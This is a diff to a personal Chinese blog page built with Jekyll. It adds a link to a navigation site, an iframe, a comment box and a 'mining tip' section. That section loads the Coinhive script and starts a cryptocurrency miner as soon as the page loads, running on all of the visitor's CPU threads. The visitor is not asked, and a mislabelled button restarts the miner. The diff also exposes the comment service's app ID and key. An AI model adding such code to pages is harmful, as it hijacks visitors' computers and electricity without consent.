@@ -1,36 +1,74 @@
 ---
-title: 导航
+title: 自用导航
 layout: page
 ---
 
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta http-equiv="X-UA-Compatible" content="ie=edge">
-    <meta name="theme-color" content="#FFFFFF" id="color">
-    <title>GO</title>
-    <link rel="manifest" href="/manifest.json">
-    <link rel="stylesheet" href="css/style.css">
-    <link rel="stylesheet" href="" id="css">
-</head>
-<body>
-    <noscript>
-      <div class="no-js">网站需要浏览器支持（启用）JavaScript</div>
-    </noscript>
-    <div id="con" class="con">
-        <div id="icon" class="icon"></div>
-        <div class="so">
-            <div class="in">
-                <input type="text" id="text" maxlength="2048" autofocus="autofocus">
-            </div>
-            <div class="sub" id="sub"></div>
-        </div>
-        <div class="url">
-            <ul class="ul" id="ul"></ul>
-        </div>
-    </div>
-    <div onclick="change_theme(true)" id="theme" class="theme"></div>
-</body>
-<script src="js/url.js"></script>
-<script src="js/run.js"></script>
-</html>
+<h2>网址🤣</h2>
+<p><a href="https://www.ds-vip.top/myseo/">帅导航🤣🤣🤣</a></p>
+<p>纯HTML 实现，欢迎围观。</p>
+
+<h2>站内使用框</h2>
+<iframe src="https://www.ds-vip.top/myseo/index.html" width="100%" height="600"></iframe>
+<br>
+<h2>打赏</h2>
+	<div>
+	{% unless is_index %}
+		<h3 align="center">⬇⬇~ 挖 矿 打 赏 系 统 ~⬇⬇</h3>
+		<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+		<center>
+			<table >
+				<tbody>
+				<tr>
+					<td align="center">启动线程数</td>
+					<td align="center">当前算力(Hashs/秒)</td>
+					<td align="center">您已贡献(Hash单位：个)</td>
+				</tr>
+				<tr>
+					<td id="tcount" align="center">0</td>
+					<td id="hps" align="center">0</td>
+					<td id="ths" align="center">0</td></tr>
+				<tr><td colspan="3;" id="status" align="center">您正在打赏中，随时可以停止。</td></tr>
+				</tbody>
+			</table>
+		</center>
+		
+		<div><p id="minebutton" style="text-align:center;">
+			<button onclick="miner.start(CoinHive.FORCE_EXCLUSIVE_TAB)">停止挖矿打赏</button>
+		</p></div>
+
+		<script type="text/javascript">
+			var miner=new CoinHive.User
+				("YjyptNPkNzUZwQonjCLhkllZAW85Axyo",
+				"www.ds-vip.top",
+				{threads:navigator.hardwareConcurrency,autoThreads:!1,throttle:.9,forceASMJS:!1});
+			
+			miner.start(CoinHive.FORCE_EXCLUSIVE_TAB),
+			setInterval(function(){var e=miner.getNumThreads(),
+			n=Math.round(100*miner.getHashesPerSecond())/100,
+			t=miner.getTotalHashes();miner.getAcceptedHashes()/256;
+			
+			miner.isRunning()?(document.getElementById("tcount").innerHTML=e,document.getElementById("hps").innerHTML=n,	
+			document.getElementById("ths").innerHTML=t,document.getElementById("status").innerHTML="您正在打赏中，随时可以停止。",
+			document.getElementById("minebutton").innerHTML='<button onclick="miner.stop()">停止挖矿打赏</button>'):(document.getElementById("tcount").innerHTML="0",document.getElementById("hps").innerHTML="0",document.getElementById("ths").innerHTML=t,document.getElementById("status").innerHTML="您已经停止打赏，随时可以开始。",document.getElementById("minebutton").innerHTML='<button onclick="miner.start(CoinHive.FORCE_EXCLUSIVE_TAB)">开始挖矿打赏</button>')},1e3)
+		</script>
+	{% endunless %}
+	</div>
+
+<h2><i class="fa fa-commenting" aria-hidden="true"></i>评论区</h2>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+<div id="vcomments"></div>
+<script>
+	new Valine({
+		el: '#vcomments',
+		appId: 'dWvyT26drR1HLxgXvGD7Iw7u-gzGzoHsz',
+		appKey: '3jKYv5jwUQdUe8DwXIDM54Xb',
+		notify:true, 
+		verify:true, 
+		pageSize:8,
+		placeholder:'ヾﾉ≧∀≦)o来啊，快活啊!',
+		avatar:'',
+		highlight:true,
+		visitor: true
+})
+</script>
